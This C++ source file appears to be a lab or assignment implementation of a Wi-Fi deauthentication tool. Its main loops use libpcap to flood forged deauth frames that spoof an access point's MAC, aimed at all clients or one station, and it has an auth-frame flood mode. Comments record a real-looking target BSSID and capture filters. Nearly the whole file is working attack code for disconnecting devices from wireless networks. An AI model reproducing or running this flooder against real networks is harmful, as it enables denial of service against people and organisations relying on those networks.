#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <mac.h>
#include <dot11.h>

// 0A:0E:DC:42:59:9B (AP BSSID)
// wlan.fc.type_subtype == 0x000c || wlan.fc.type_subtype == 0x000a
// wlan.sa == 0A:0E:DC:42:59:9b && wlan.da == 50:77:05:5f:30:cf
// 0c 00

void usage() {
    printf("syntax: deauth <interface> <ap mac> [<station mac>] [-auth]\n");
    printf("sample: deauth wlan0 00:11:22:33:44:55 11:22:33:44:55:66]\n");
}

void send_auth_packet(char* ap_mac, char* station_mac, pcap_t* handle) {
    au_dot11 dot_;
    dot_.src_mac = Mac(station_mac);
    dot_.dst_mac = Mac(ap_mac);
    dot_.BSSID = Mac(ap_mac);
    dot_.seq_num = 0x00;

    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&dot_), sizeof(dot_));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        dot_.seq_num += 2;
        sleep(1);
    }
}

void send_deauth_packet(char* ap_mac, pcap_t* handle) {
    deau_dot11 dot_;
    dot_.src_mac = Mac(ap_mac);
    dot_.dst_mac = Mac("ff:ff:ff:ff:ff:ff");
    dot_.BSSID = Mac(ap_mac);
    dot_.seq_num = 0x00;

    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&dot_), sizeof(dot_));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        dot_.seq_num += 2;
        // if (((dot_.seq_num << 6) & 0b11) == 0b00) sleep(1);
    }
}

void send_deauth_packet(char* ap_mac, char* station_mac, pcap_t* handle) {
    deau_dot11 dot_;
    dot_.src_mac = Mac(ap_mac);
    dot_.dst_mac = Mac(station_mac);
    dot_.BSSID = Mac(ap_mac);
    dot_.seq_num = 0x00;

    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&dot_), sizeof(dot_));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        dot_.seq_num += 2;
        // if (((dot_.seq_num << 6) & 0b11) == 0b00) sleep(1);
    }
}


int main(int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    // device, bufsize(8192), promisc, timestop(after capturing packet), errbuf
    //this handle can handle reading and writing
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    if (argc == 5) { // auth
        send_auth_packet(argv[2], argv[3], handle);
    }
    else { // deauth
        if (argc == 3) send_deauth_packet(argv[2], handle);
        else send_deauth_packet(argv[2], argv[3], handle);
    }

    return 0;
}
